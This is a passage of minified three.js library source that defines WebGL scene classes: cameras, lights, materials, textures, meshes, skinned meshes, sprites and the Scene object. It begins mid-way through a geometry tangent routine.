this.attributes.tangent){var k=4*h;this.attributes.tangent={itemSize:4,array:new Float32Array(k),numItems:k}}for(var p=this.attributes.tangent.array,m=[],t=[],k=0;k<h;k++)m[k]=new THREE.Vector3,t[k]=new THREE.Vector3;var w,q,y,r,z,C,B,D,G,W,u,O,K,F,L,I,J,M,T,H,Z,Y,X,V,ja,ia,pa=new THREE.Vector3,wa=new THREE.Vector3,Ja,Oa,ta,Ia,P,ga=this.offsets,k=0;for(Oa=ga.length;k<Oa;++k){Ja=ga[k].start;ta=ga[k].count;var ib=ga[k].index,h=Ja;for(Ja+=ta;h<Ja;h+=3)ta=ib+c[h],Ia=ib+c[h+1],P=ib+c[h+2],a(ta,Ia,P)}var Sa=
new THREE.Vector3,Db=new THREE.Vector3,ab=new THREE.Vector3,Ta=new THREE.Vector3,cb,kb,Aa,k=0;for(Oa=ga.length;k<Oa;++k)for(Ja=ga[k].start,ta=ga[k].count,ib=ga[k].index,h=Ja,Ja+=ta;h<Ja;h+=3)ta=ib+c[h],Ia=ib+c[h+1],P=ib+c[h+2],b(ta),b(Ia),b(P);this.tangentsNeedUpdate=this.hasTangents=!0}},dispose:function(){this.dispatchEvent({type:"dispose"})}};
THREE.Camera=function(){THREE.Object3D.call(this);this.matrixWorldInverse=new THREE.Matrix4;this.projectionMatrix=new THREE.Matrix4;this.projectionMatrixInverse=new THREE.Matrix4};THREE.Camera.prototype=Object.create(THREE.Object3D.prototype);THREE.Camera.prototype.lookAt=function(){var a=new THREE.Matrix4;return function(b){a.lookAt(this.position,b,this.up);!0===this.useQuaternion?this.quaternion.setFromRotationMatrix(a):this.rotation.setEulerFromRotationMatrix(a,this.eulerOrder)}}();
THREE.OrthographicCamera=function(a,b,c,e,g,f){THREE.Camera.call(this);this.left=a;this.right=b;this.top=c;this.bottom=e;this.near=void 0!==g?g:.1;this.far=void 0!==f?f:2E3;this.updateProjectionMatrix()};THREE.OrthographicCamera.prototype=Object.create(THREE.Camera.prototype);THREE.OrthographicCamera.prototype.updateProjectionMatrix=function(){this.projectionMatrix.makeOrthographic(this.left,this.right,this.top,this.bottom,this.near,this.far)};
THREE.PerspectiveCamera=function(a,b,c,e){THREE.Camera.call(this);this.fov=void 0!==a?a:50;this.aspect=void 0!==b?b:1;this.near=void 0!==c?c:.1;this.far=void 0!==e?e:2E3;this.updateProjectionMatrix()};THREE.PerspectiveCamera.prototype=Object.create(THREE.Camera.prototype);THREE.PerspectiveCamera.prototype.setLens=function(a,b){void 0===b&&(b=24);this.fov=2*THREE.Math.radToDeg(Math.atan(b/(2*a)));this.updateProjectionMatrix()};
THREE.PerspectiveCamera.prototype.setViewOffset=function(a,b,c,e,g,f){this.fullWidth=a;this.fullHeight=b;this.x=c;this.y=e;this.width=g;this.height=f;this.updateProjectionMatrix()};
THREE.PerspectiveCamera.prototype.updateProjectionMatrix=function(){if(this.fullWidth){var a=this.fullWidth/this.fullHeight,b=Math.tan(THREE.Math.degToRad(.5*this.fov))*this.near,c=-b,e=a*c,a=Math.abs(a*b-e),c=Math.abs(b-c);this.projectionMatrix.makeFrustum(e+this.x*a/this.fullWidth,e+(this.x+this.width)*a/this.fullWidth,b-(this.y+this.height)*c/this.fullHeight,b-this.y*c/this.fullHeight,this.near,this.far)}else this.projectionMatrix.makePerspective(this.fov,this.aspect,this.near,this.far)};
THREE.Light=function(a){THREE.Object3D.call(this);this.color=new THREE.Color(a)};THREE.Light.prototype=Object.create(THREE.Object3D.prototype);THREE.Light.prototype.clone=function(a){void 0===a&&(a=new THREE.Light);THREE.Object3D.prototype.clone.call(this,a);a.color.copy(this.color);return a};THREE.AmbientLight=function(a){THREE.Light.call(this,a)};THREE.AmbientLight.prototype=Object.create(THREE.Light.prototype);
THREE.AmbientLight.prototype.clone=function(){var a=new THREE.AmbientLight;THREE.Light.prototype.clone.call(this,a);return a};THREE.AreaLight=function(a,b){THREE.Light.call(this,a);this.normal=new THREE.Vector3(0,-1,0);this.right=new THREE.Vector3(1,0,0);this.intensity=void 0!==b?b:1;this.height=this.width=1;this.constantAttenuation=1.5;this.linearAttenuation=.5;this.quadraticAttenuation=.1};THREE.AreaLight.prototype=Object.create(THREE.Light.prototype);
THREE.DirectionalLight=function(a,b){THREE.Light.call(this,a);this.position.set(0,1,0);this.target=new THREE.Object3D;this.intensity=void 0!==b?b:1;this.onlyShadow=this.castShadow=!1;this.shadowCameraNear=50;this.shadowCameraFar=5E3;this.shadowCameraLeft=-500;this.shadowCameraTop=this.shadowCameraRight=500;this.shadowCameraBottom=-500;this.shadowCameraVisible=!1;this.shadowBias=0;this.shadowDarkness=.5;this.shadowMapHeight=this.shadowMapWidth=512;this.shadowCascade=!1;this.shadowCascadeOffset=new THREE.Vector3(0,
0,-1E3);this.shadowCascadeCount=2;this.shadowCascadeBias=[0,0,0];this.shadowCascadeWidth=[512,512,512];this.shadowCascadeHeight=[512,512,512];this.shadowCascadeNearZ=[-1,.99,.998];this.shadowCascadeFarZ=[.99,.998,1];this.shadowCascadeArray=[];this.shadowMatrix=this.shadowCamera=this.shadowMapSize=this.shadowMap=null};THREE.DirectionalLight.prototype=Object.create(THREE.Light.prototype);
THREE.DirectionalLight.prototype.clone=function(){var a=new THREE.DirectionalLight;THREE.Light.prototype.clone.call(this,a);a.target=this.target.clone();a.intensity=this.intensity;a.castShadow=this.castShadow;a.onlyShadow=this.onlyShadow;return a};THREE.HemisphereLight=function(a,b,c){THREE.Light.call(this,a);this.position.set(0,100,0);this.groundColor=new THREE.Color(b);this.intensity=void 0!==c?c:1};THREE.HemisphereLight.prototype=Object.create(THREE.Light.prototype);
THREE.HemisphereLight.prototype.clone=function(){var a=new THREE.PointLight;THREE.Light.prototype.clone.call(this,a);a.groundColor.copy(this.groundColor);a.intensity=this.intensity;return a};THREE.PointLight=function(a,b,c){THREE.Light.call(this,a);this.intensity=void 0!==b?b:1;this.distance=void 0!==c?c:0};THREE.PointLight.prototype=Object.create(THREE.Light.prototype);
THREE.PointLight.prototype.clone=function(){var a=new THREE.PointLight;THREE.Light.prototype.clone.call(this,a);a.intensity=this.intensity;a.distance=this.distance;return a};
THREE.SpotLight=function(a,b,c,e,g){THREE.Light.call(this,a);this.position.set(0,1,0);this.target=new THREE.Object3D;this.intensity=void 0!==b?b:1;this.distance=void 0!==c?c:0;this.angle=void 0!==e?e:Math.PI/3;this.exponent=void 0!==g?g:10;this.onlyShadow=this.castShadow=!1;this.shadowCameraNear=50;this.shadowCameraFar=5E3;this.shadowCameraFov=50;this.shadowCameraVisible=!1;this.shadowBias=0;this.shadowDarkness=.5;this.shadowMapHeight=this.shadowMapWidth=512;this.shadowMatrix=this.shadowCamera=this.shadowMapSize=
this.shadowMap=null};THREE.SpotLight.prototype=Object.create(THREE.Light.prototype);THREE.SpotLight.prototype.clone=function(){var a=new THREE.SpotLight;THREE.Light.prototype.clone.call(this,a);a.target=this.target.clone();a.intensity=this.intensity;a.distance=this.distance;a.angle=this.angle;a.exponent=this.exponent;a.castShadow=this.castShadow;a.onlyShadow=this.onlyShadow;return a};
THREE.Material=function(){this.id=THREE.MaterialIdCount++;this.name="";this.side=THREE.FrontSide;this.opacity=1;this.transparent=!1;this.blending=THREE.NormalBlending;this.blendSrc=THREE.SrcAlphaFactor;this.blendDst=THREE.OneMinusSrcAlphaFactor;this.blendEquation=THREE.AddEquation;this.depthWrite=this.depthTest=!0;this.polygonOffset=!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.overdraw=!1;this.needsUpdate=this.visible=!0};
THREE.Material.prototype={constructor:THREE.Material,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,setValues:function(a){if(void 0!==a)for(var b in a){var c=a[b];if(void 0===c)console.warn("THREE.Material: '"+b+"' parameter is undefined.");else if(b in this){var e=this[b];e instanceof
THREE.Color?e.set(c):e instanceof THREE.Vector3&&c instanceof THREE.Vector3?e.copy(c):this[b]=c}}},clone:function(a){void 0===a&&(a=new THREE.Material);a.name=this.name;a.side=this.side;a.opacity=this.opacity;a.transparent=this.transparent;a.blending=this.blending;a.blendSrc=this.blendSrc;a.blendDst=this.blendDst;a.blendEquation=this.blendEquation;a.depthTest=this.depthTest;a.depthWrite=this.depthWrite;a.polygonOffset=this.polygonOffset;a.polygonOffsetFactor=this.polygonOffsetFactor;a.polygonOffsetUnits=
this.polygonOffsetUnits;a.alphaTest=this.alphaTest;a.overdraw=this.overdraw;a.visible=this.visible;return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.MaterialIdCount=0;THREE.LineBasicMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.linewidth=1;this.linejoin=this.linecap="round";this.vertexColors=!1;this.fog=!0;this.setValues(a)};THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.LineBasicMaterial.prototype.clone=function(){var a=new THREE.LineBasicMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.linewidth=this.linewidth;a.linecap=this.linecap;a.linejoin=this.linejoin;a.vertexColors=this.vertexColors;a.fog=this.fog;return a};THREE.LineDashedMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.scale=this.linewidth=1;this.dashSize=3;this.gapSize=1;this.vertexColors=!1;this.fog=!0;this.setValues(a)};
THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineDashedMaterial.prototype.clone=function(){var a=new THREE.LineDashedMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.linewidth=this.linewidth;a.scale=this.scale;a.dashSize=this.dashSize;a.gapSize=this.gapSize;a.vertexColors=this.vertexColors;a.fog=this.fog;return a};
THREE.MeshBasicMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.envMap=this.specularMap=this.lightMap=this.map=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.fog=!0;this.shading=THREE.SmoothShading;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap="round";this.vertexColors=THREE.NoColors;this.morphTargets=this.skinning=!1;this.setValues(a)};
THREE.MeshBasicMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.MeshBasicMaterial.prototype.clone=function(){var a=new THREE.MeshBasicMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.map=this.map;a.lightMap=this.lightMap;a.specularMap=this.specularMap;a.envMap=this.envMap;a.combine=this.combine;a.reflectivity=this.reflectivity;a.refractionRatio=this.refractionRatio;a.fog=this.fog;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.wireframeLinecap=this.wireframeLinecap;a.wireframeLinejoin=
this.wireframeLinejoin;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;return a};
THREE.MeshLambertMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.ambient=new THREE.Color(16777215);this.emissive=new THREE.Color(0);this.wrapAround=!1;this.wrapRGB=new THREE.Vector3(1,1,1);this.envMap=this.specularMap=this.lightMap=this.map=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.fog=!0;this.shading=THREE.SmoothShading;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=
"round";this.vertexColors=THREE.NoColors;this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.MeshLambertMaterial.prototype.clone=function(){var a=new THREE.MeshLambertMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.ambient.copy(this.ambient);a.emissive.copy(this.emissive);a.wrapAround=this.wrapAround;a.wrapRGB.copy(this.wrapRGB);a.map=this.map;a.lightMap=this.lightMap;a.specularMap=this.specularMap;a.envMap=this.envMap;a.combine=this.combine;a.reflectivity=this.reflectivity;a.refractionRatio=this.refractionRatio;a.fog=this.fog;a.shading=this.shading;
a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.wireframeLinecap=this.wireframeLinecap;a.wireframeLinejoin=this.wireframeLinejoin;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;a.morphNormals=this.morphNormals;return a};
THREE.MeshPhongMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.ambient=new THREE.Color(16777215);this.emissive=new THREE.Color(0);this.specular=new THREE.Color(1118481);this.shininess=30;this.metal=!1;this.perPixel=!0;this.wrapAround=!1;this.wrapRGB=new THREE.Vector3(1,1,1);this.bumpMap=this.lightMap=this.map=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new THREE.Vector2(1,1);this.envMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;
this.reflectivity=1;this.refractionRatio=.98;this.fog=!0;this.shading=THREE.SmoothShading;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap="round";this.vertexColors=THREE.NoColors;this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.MeshPhongMaterial.prototype.clone=function(){var a=new THREE.MeshPhongMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.ambient.copy(this.ambient);a.emissive.copy(this.emissive);a.specular.copy(this.specular);a.shininess=this.shininess;a.metal=this.metal;a.perPixel=this.perPixel;a.wrapAround=this.wrapAround;a.wrapRGB.copy(this.wrapRGB);a.map=this.map;a.lightMap=this.lightMap;a.bumpMap=this.bumpMap;a.bumpScale=this.bumpScale;a.normalMap=this.normalMap;a.normalScale.copy(this.normalScale);
a.specularMap=this.specularMap;a.envMap=this.envMap;a.combine=this.combine;a.reflectivity=this.reflectivity;a.refractionRatio=this.refractionRatio;a.fog=this.fog;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.wireframeLinecap=this.wireframeLinecap;a.wireframeLinejoin=this.wireframeLinejoin;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;a.morphNormals=this.morphNormals;return a};
THREE.MeshDepthMaterial=function(a){THREE.Material.call(this);this.wireframe=!1;this.wireframeLinewidth=1;this.setValues(a)};THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshDepthMaterial.prototype.clone=function(){var a=new THREE.MeshDepthMaterial;THREE.Material.prototype.clone.call(this,a);a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;return a};
THREE.MeshNormalMaterial=function(a){THREE.Material.call(this,a);this.shading=THREE.FlatShading;this.wireframe=!1;this.wireframeLinewidth=1;this.morphTargets=!1;this.setValues(a)};THREE.MeshNormalMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshNormalMaterial.prototype.clone=function(){var a=new THREE.MeshNormalMaterial;THREE.Material.prototype.clone.call(this,a);a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;return a};
THREE.MeshFaceMaterial=function(a){this.materials=a instanceof Array?a:[]};THREE.MeshFaceMaterial.prototype.clone=function(){return new THREE.MeshFaceMaterial(this.materials.slice(0))};THREE.ParticleBasicMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.map=null;this.size=1;this.sizeAttenuation=!0;this.vertexColors=!1;this.fog=!0;this.setValues(a)};THREE.ParticleBasicMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.ParticleBasicMaterial.prototype.clone=function(){var a=new THREE.ParticleBasicMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.map=this.map;a.size=this.size;a.sizeAttenuation=this.sizeAttenuation;a.vertexColors=this.vertexColors;a.fog=this.fog;return a};
THREE.ShaderMaterial=function(a){THREE.Material.call(this);this.vertexShader=this.fragmentShader="void main() {}";this.uniforms={};this.defines={};this.attributes=null;this.shading=THREE.SmoothShading;this.linewidth=1;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.vertexColors=THREE.NoColors;this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.ShaderMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.ShaderMaterial.prototype.clone=function(){var a=new THREE.ShaderMaterial;THREE.Material.prototype.clone.call(this,a);a.fragmentShader=this.fragmentShader;a.vertexShader=this.vertexShader;a.uniforms=THREE.UniformsUtils.clone(this.uniforms);a.attributes=this.attributes;a.defines=this.defines;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.fog=this.fog;a.lights=this.lights;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=
this.morphTargets;a.morphNormals=this.morphNormals;return a};
THREE.SpriteMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.map=new THREE.Texture;this.useScreenCoordinates=!0;this.depthTest=!this.useScreenCoordinates;this.sizeAttenuation=!this.useScreenCoordinates;this.scaleByViewport=!this.sizeAttenuation;this.alignment=THREE.SpriteAlignment.center.clone();this.fog=!1;this.uvOffset=new THREE.Vector2(0,0);this.uvScale=new THREE.Vector2(1,1);this.setValues(a);a=a||{};void 0===a.depthTest&&(this.depthTest=!this.useScreenCoordinates);
void 0===a.sizeAttenuation&&(this.sizeAttenuation=!this.useScreenCoordinates);void 0===a.scaleByViewport&&(this.scaleByViewport=!this.sizeAttenuation)};THREE.SpriteMaterial.prototype=Object.create(THREE.Material.prototype);
THREE.SpriteMaterial.prototype.clone=function(){var a=new THREE.SpriteMaterial;THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.map=this.map;a.useScreenCoordinates=this.useScreenCoordinates;a.sizeAttenuation=this.sizeAttenuation;a.scaleByViewport=this.scaleByViewport;a.alignment.copy(this.alignment);a.uvOffset.copy(this.uvOffset);a.uvScale.copy(this.uvScale);a.fog=this.fog;return a};THREE.SpriteAlignment={};THREE.SpriteAlignment.topLeft=new THREE.Vector2(1,-1);
THREE.SpriteAlignment.topCenter=new THREE.Vector2(0,-1);THREE.SpriteAlignment.topRight=new THREE.Vector2(-1,-1);THREE.SpriteAlignment.centerLeft=new THREE.Vector2(1,0);THREE.SpriteAlignment.center=new THREE.Vector2(0,0);THREE.SpriteAlignment.centerRight=new THREE.Vector2(-1,0);THREE.SpriteAlignment.bottomLeft=new THREE.Vector2(1,1);THREE.SpriteAlignment.bottomCenter=new THREE.Vector2(0,1);THREE.SpriteAlignment.bottomRight=new THREE.Vector2(-1,1);
THREE.Texture=function(a,b,c,e,g,f,h,k,p){this.id=THREE.TextureIdCount++;this.name="";this.image=a;this.mipmaps=[];this.mapping=void 0!==b?b:new THREE.UVMapping;this.wrapS=void 0!==c?c:THREE.ClampToEdgeWrapping;this.wrapT=void 0!==e?e:THREE.ClampToEdgeWrapping;this.magFilter=void 0!==g?g:THREE.LinearFilter;this.minFilter=void 0!==f?f:THREE.LinearMipMapLinearFilter;this.anisotropy=void 0!==p?p:1;this.format=void 0!==h?h:THREE.RGBAFormat;this.type=void 0!==k?k:THREE.UnsignedByteType;this.offset=new THREE.Vector2(0,
0);this.repeat=new THREE.Vector2(1,1);this.generateMipmaps=!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.needsUpdate=!1;this.onUpdate=null};
THREE.Texture.prototype={constructor:THREE.Texture,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,clone:function(a){void 0===a&&(a=new THREE.Texture);a.image=this.image;a.mipmaps=this.mipmaps.slice(0);a.mapping=this.mapping;a.wrapS=this.wrapS;a.wrapT=this.wrapT;a.magFilter=this.magFilter;
a.minFilter=this.minFilter;a.anisotropy=this.anisotropy;a.format=this.format;a.type=this.type;a.offset.copy(this.offset);a.repeat.copy(this.repeat);a.generateMipmaps=this.generateMipmaps;a.premultiplyAlpha=this.premultiplyAlpha;a.flipY=this.flipY;a.unpackAlignment=this.unpackAlignment;return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.TextureIdCount=0;
THREE.CompressedTexture=function(a,b,c,e,g,f,h,k,p,m,t){THREE.Texture.call(this,null,f,h,k,p,m,e,g,t);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=!1};THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CompressedTexture.prototype.clone=function(){var a=new THREE.CompressedTexture;THREE.Texture.prototype.clone.call(this,a);return a};
THREE.DataTexture=function(a,b,c,e,g,f,h,k,p,m,t){THREE.Texture.call(this,null,f,h,k,p,m,e,g,t);this.image={data:a,width:b,height:c}};THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DataTexture.prototype.clone=function(){var a=new THREE.DataTexture;THREE.Texture.prototype.clone.call(this,a);return a};THREE.Particle=function(a){THREE.Object3D.call(this);this.material=a};THREE.Particle.prototype=Object.create(THREE.Object3D.prototype);
THREE.Particle.prototype.clone=function(a){void 0===a&&(a=new THREE.Particle(this.material));THREE.Object3D.prototype.clone.call(this,a);return a};THREE.ParticleSystem=function(a,b){THREE.Object3D.call(this);this.geometry=a;this.material=void 0!==b?b:new THREE.ParticleBasicMaterial({color:16777215*Math.random()});this.sortParticles=!1;this.geometry&&null===this.geometry.boundingSphere&&this.geometry.computeBoundingSphere();this.frustumCulled=!1};THREE.ParticleSystem.prototype=Object.create(THREE.Object3D.prototype);
THREE.ParticleSystem.prototype.clone=function(a){void 0===a&&(a=new THREE.ParticleSystem(this.geometry,this.material));a.sortParticles=this.sortParticles;THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Line=function(a,b,c){THREE.Object3D.call(this);this.geometry=a;this.material=void 0!==b?b:new THREE.LineBasicMaterial({color:16777215*Math.random()});this.type=void 0!==c?c:THREE.LineStrip;this.geometry&&(this.geometry.boundingSphere||this.geometry.computeBoundingSphere())};
THREE.LineStrip=0;THREE.LinePieces=1;THREE.Line.prototype=Object.create(THREE.Object3D.prototype);THREE.Line.prototype.clone=function(a){void 0===a&&(a=new THREE.Line(this.geometry,this.material,this.type));THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Mesh=function(a,b){THREE.Object3D.call(this);this.material=this.geometry=null;this.setGeometry(a);this.setMaterial(b)};THREE.Mesh.prototype=Object.create(THREE.Object3D.prototype);
THREE.Mesh.prototype.setGeometry=function(a){void 0!==a&&(this.geometry=a,null===this.geometry.boundingSphere&&this.geometry.computeBoundingSphere(),this.updateMorphTargets())};THREE.Mesh.prototype.setMaterial=function(a){this.material=void 0!==a?a:new THREE.MeshBasicMaterial({color:16777215*Math.random(),wireframe:!0})};
THREE.Mesh.prototype.updateMorphTargets=function(){if(0<this.geometry.morphTargets.length){this.morphTargetBase=-1;this.morphTargetForcedOrder=[];this.morphTargetInfluences=[];this.morphTargetDictionary={};for(var a=0,b=this.geometry.morphTargets.length;a<b;a++)this.morphTargetInfluences.push(0),this.morphTargetDictionary[this.geometry.morphTargets[a].name]=a}};
THREE.Mesh.prototype.getMorphTargetIndexByName=function(a){if(void 0!==this.morphTargetDictionary[a])return this.morphTargetDictionary[a];console.log("THREE.Mesh.getMorphTargetIndexByName: morph target "+a+" does not exist. Returning 0.");return 0};THREE.Mesh.prototype.clone=function(a){void 0===a&&(a=new THREE.Mesh(this.geometry,this.material));THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Bone=function(a){THREE.Object3D.call(this);this.skin=a;this.skinMatrix=new THREE.Matrix4};
THREE.Bone.prototype=Object.create(THREE.Object3D.prototype);THREE.Bone.prototype.update=function(a,b){this.matrixAutoUpdate&&(b|=this.updateMatrix());if(b||this.matrixWorldNeedsUpdate)a?this.skinMatrix.multiplyMatrices(a,this.matrix):this.skinMatrix.copy(this.matrix),this.matrixWorldNeedsUpdate=!1,b=!0;var c,e=this.children.length;for(c=0;c<e;c++)this.children[c].update(this.skinMatrix,b)};
THREE.SkinnedMesh=function(a,b,c){THREE.Mesh.call(this,a,b);this.useVertexTexture=void 0!==c?c:!0;this.identityMatrix=new THREE.Matrix4;this.bones=[];this.boneMatrices=[];var e,g,f;if(this.geometry&&void 0!==this.geometry.bones){for(a=0;a<this.geometry.bones.length;a++)c=this.geometry.bones[a],e=c.pos,g=c.rotq,f=c.scl,b=this.addBone(),b.name=c.name,b.position.set(e[0],e[1],e[2]),b.quaternion.set(g[0],g[1],g[2],g[3]),b.useQuaternion=!0,void 0!==f?b.scale.set(f[0],f[1],f[2]):b.scale.set(1,1,1);for(a=
0;a<this.bones.length;a++)c=this.geometry.bones[a],b=this.bones[a],-1===c.parent?this.add(b):this.bones[c.parent].add(b);a=this.bones.length;this.useVertexTexture?(this.boneTextureHeight=this.boneTextureWidth=a=256<a?64:64<a?32:16<a?16:8,this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4),this.boneTexture=new THREE.DataTexture(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,THREE.RGBAFormat,THREE.FloatType),this.boneTexture.minFilter=THREE.NearestFilter,
this.boneTexture.magFilter=THREE.NearestFilter,this.boneTexture.generateMipmaps=!1,this.boneTexture.flipY=!1):this.boneMatrices=new Float32Array(16*a);this.pose()}};THREE.SkinnedMesh.prototype=Object.create(THREE.Mesh.prototype);THREE.SkinnedMesh.prototype.addBone=function(a){void 0===a&&(a=new THREE.Bone(this));this.bones.push(a);return a};
THREE.SkinnedMesh.prototype.updateMatrixWorld=function(a){this.matrixAutoUpdate&&this.updateMatrix();if(this.matrixWorldNeedsUpdate||a)this.parent?this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix):this.matrixWorld.copy(this.matrix),this.matrixWorldNeedsUpdate=!1;a=0;for(var b=this.children.length;a<b;a++){var c=this.children[a];c instanceof THREE.Bone?c.update(this.identityMatrix,!1):c.updateMatrixWorld(!0)}if(void 0==this.boneInverses)for(this.boneInverses=[],a=0,b=this.bones.length;a<
b;a++)c=new THREE.Matrix4,c.getInverse(this.bones[a].skinMatrix),this.boneInverses.push(c);a=0;for(b=this.bones.length;a<b;a++)THREE.SkinnedMesh.offsetMatrix.multiplyMatrices(this.bones[a].skinMatrix,this.boneInverses[a]),THREE.SkinnedMesh.offsetMatrix.flattenToArrayOffset(this.boneMatrices,16*a);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)};
THREE.SkinnedMesh.prototype.pose=function(){this.updateMatrixWorld(!0);for(var a=0;a<this.geometry.skinIndices.length;a++){var b=this.geometry.skinWeights[a],c=1/b.lengthManhattan();Infinity!==c?b.multiplyScalar(c):b.set(1)}};THREE.SkinnedMesh.prototype.clone=function(a){void 0===a&&(a=new THREE.SkinnedMesh(this.geometry,this.material,this.useVertexTexture));THREE.Mesh.prototype.clone.call(this,a);return a};THREE.SkinnedMesh.offsetMatrix=new THREE.Matrix4;
THREE.Ribbon=function(a,b){THREE.Object3D.call(this);this.geometry=a;this.material=b};THREE.Ribbon.prototype=Object.create(THREE.Object3D.prototype);THREE.Ribbon.prototype.clone=function(a){void 0===a&&(a=new THREE.Ribbon(this.geometry,this.material));THREE.Object3D.prototype.clone.call(this,a);return a};THREE.LOD=function(){THREE.Object3D.call(this);this.objects=[]};THREE.LOD.prototype=Object.create(THREE.Object3D.prototype);
THREE.LOD.prototype.addLevel=function(a,b){void 0===b&&(b=0);b=Math.abs(b);for(var c=0;c<this.objects.length&&!(b<this.objects[c].distance);c++);this.objects.splice(c,0,{distance:b,object:a});this.add(a)};THREE.LOD.prototype.getObjectForDistance=function(a){for(var b=1,c=this.objects.length;b<c&&!(a<this.objects[b].distance);b++);return this.objects[b-1].object};
THREE.LOD.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){if(1<this.objects.length){a.getPositionFromMatrix(c.matrixWorld);b.getPositionFromMatrix(this.matrixWorld);c=a.distanceTo(b);this.objects[0].object.visible=!0;for(var e=1,g=this.objects.length;e<g;e++)if(c>=this.objects[e].distance)this.objects[e-1].object.visible=!1,this.objects[e].object.visible=!0;else break;for(;e<g;e++)this.objects[e].object.visible=!1}}}();THREE.LOD.prototype.clone=function(){};
THREE.Sprite=function(a){THREE.Object3D.call(this);this.material=void 0!==a?a:new THREE.SpriteMaterial;this.rotation3d=this.rotation;this.rotation=0};THREE.Sprite.prototype=Object.create(THREE.Object3D.prototype);THREE.Sprite.prototype.updateMatrix=function(){this.rotation3d.set(0,0,this.rotation);this.quaternion.setFromEuler(this.rotation3d,this.eulerOrder);this.matrix.makeFromPositionQuaternionScale(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=!0};
THREE.Sprite.prototype.clone=function(a){void 0===a&&(a=new THREE.Sprite(this.material));THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Scene=function(){THREE.Object3D.call(this);this.overrideMaterial=this.fog=null;this.autoUpdate=!0;this.matrixAutoUpdate=!1;this.__objects=[];this.__lights=[];this.__objectsAdded=[];this.__objectsRemoved=[]};THREE.Scene.prototype=Object.create(THREE.Object3D.prototype);
